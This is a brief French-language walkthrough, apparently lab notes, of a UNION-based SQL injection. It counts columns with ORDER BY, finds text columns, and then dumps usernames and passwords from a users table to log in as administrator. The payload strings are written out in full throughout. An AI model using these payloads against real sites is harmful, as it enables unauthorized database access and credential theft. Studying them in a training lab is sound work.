
![Pasted image 20260224131718.png](../../../Zimg/Pasted%20image%2020260224131718.png)

Pour chercher les credentials pour nous connecter dans la base de données , on va tout simplement chercher il y a combien de columns et lesquelles acceptent les strings 

' ORDER BY 1--
'+ORDER+BY+1--
![Pasted image 20260224141615.png](../../../Zimg/Pasted%20image%2020260224141615.png)
il n'y a que 2 columns.

on va chercher mtn laquelle accepte du text
' UNION SELECT 'a',NULL--
' UNION SELECT NULL,'a'--
'+UNION+SELECT+'a',NULL--
'+UNION+SELECT+NULL,'a'--
![Pasted image 20260224143103.png](../../../Zimg/Pasted%20image%2020260224143103.png)
![Pasted image 20260224143119.png](../../../Zimg/Pasted%20image%2020260224143119.png)
les 2 acceptent le texte


on va chercher les mots username et password de la table users mtn pour faire apparaitre l'admin et se log 

' UNION SELECT username,password FROM users--
'+UNION+SELECT+username,password+FROM+users--
![Pasted image 20260224144432.png](../../../Zimg/Pasted%20image%2020260224144432.png)
![Pasted image 20260224144549.png](../../../Zimg/Pasted%20image%2020260224144549.png)
On a put voir diff users et mdp mais on va se concentrer sur celui qui a le username administrator
![Pasted image 20260224144727.png](../../../Zimg/Pasted%20image%2020260224144727.png)
on va se log 
![Pasted image 20260224144752.png](../../../Zimg/Pasted%20image%2020260224144752.png)
et voilà on a réussit 
